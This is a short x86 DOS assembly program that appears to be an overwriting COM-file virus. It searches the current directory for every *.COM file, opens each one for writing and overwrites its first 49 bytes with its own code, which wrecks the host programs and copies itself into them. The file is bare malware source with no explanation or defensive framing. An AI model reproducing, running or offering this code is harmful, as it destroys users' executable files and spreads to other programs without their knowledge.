.model tiny 
.386

.CODE
ORG 100h
Filename EQU 9Eh

start:
    mov ah, 4Eh
    xor cx, cx
    mov dx, OFFSET COM     ;search filename
    int 21h
    
Search:
    jc Done
    mov ah, 3Dh
    mov al, 2
    mov dx, Filename
    int 21h
    
    xchg ax, bx
    mov ah, 40h
    mov cx, 49
    mov dx, 100h
    int 21h
    
    mov ah, 4Fh
    int 21h
    jmp Search
    
Done:
    mov ah, 4Ch
    int 21h

COM db "*.COM",0

end start
